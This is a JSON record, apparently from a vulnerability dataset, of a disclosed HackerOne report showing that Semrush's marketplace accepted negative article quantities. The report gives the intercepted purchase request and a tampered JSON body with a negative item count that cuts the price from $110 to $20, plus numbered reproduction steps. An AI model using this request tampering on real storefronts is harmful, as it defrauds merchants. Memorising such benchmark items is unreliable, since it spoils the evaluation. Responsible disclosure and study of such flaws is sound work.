@@ -1,0 +1,50 @@
+{
+    "reported_to": "Semrush",
+    "reported_by": "yashrs ",
+    "title": "An attacker can buy marketplace articles for lower prices as it allows for negative quantity values leading to business loss",
+    "content": "\nHi there,\nWhen we\nSummary:\nWhen someone goes to https://www.semrush.com/marketplace/offers/ and orders for articles, an attacker can pay for less than intended due to negative quantities being allowed.\nSteps To Reproduce:\nGo to https://www.semrush.com/marketplace/offers/\nClick on 500 Words($40) Order Now button.\nSelect any two articles.\nIntercept the request:\nCode 468 Bytes\n1POST /marketplace/api/purchases/bulk HTTP/1.1\n2Host: www.semrush.com\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\n4Accept: application/json\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Referer: https://www.semrush.com/marketplace/offers/\n8Content-type: application/json\n9Origin: https://www.semrush.com\n10Content-Length: 45\n11DNT: 1\n12Connection: close\n13Cookie: COOKIES\n14\n15{\"items\":{\"article_500\":1,\"article_1000\":1}}\nThe actual price should be $110 for two articles.\nChange the JSON body to :\nCode 45 Bytes\n1{\"items\":{\"article_500\":4,\"article_1000\":-2}}\nThe cost will become $20 for two articles: 4 $40- 2 $70= $160 - $140 = $20\n\u2588\u2588\u2588\u2588\nI even tried with my Virtual Card. Here is the failed payment. This is the proof that it actually charges the lowered amount:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nRegards,\nYash\nImpact\nAn attacker can buy articles at much lower rates by exploiting this vulnerability which could cause severe business losses to Semrush\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Business Logic Errors"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1585834500,
+    "report_url": "https://hackerone.com/reports/771694",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Go to https://www.semrush.com/marketplace/offers/"
+        ],
+        [
+            2,
+            "Click on 500 Words($40) Order Now button and select any two articles"
+        ],
+        [
+            3,
+            "Intercept the request using a tool like Burp Suite or browser dev tools"
+        ],
+        [
+            4,
+            "Modify the JSON body to include negative quantities, e.g., {\"items\":{\"article_500\":4,\"article_1000\":-2}}"
+        ],
+        [
+            5,
+            "Observe the reduced price calculation and complete the purchase"
+        ]
+    ],
+    "vuln_description": "An attacker can manipulate the quantity values in the purchase request to include negative numbers, which results in a lower total price than intended. This allows purchasing marketplace articles at a fraction of their actual cost, leading to potential business losses.",
+    "reason": "The vulnerability involves intercepting and modifying a simple HTTP request, which is a common technique in web security testing. The manipulation of quantity values to include negatives is a straightforward arithmetic trick without requiring deep understanding of complex application states or novel logic.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
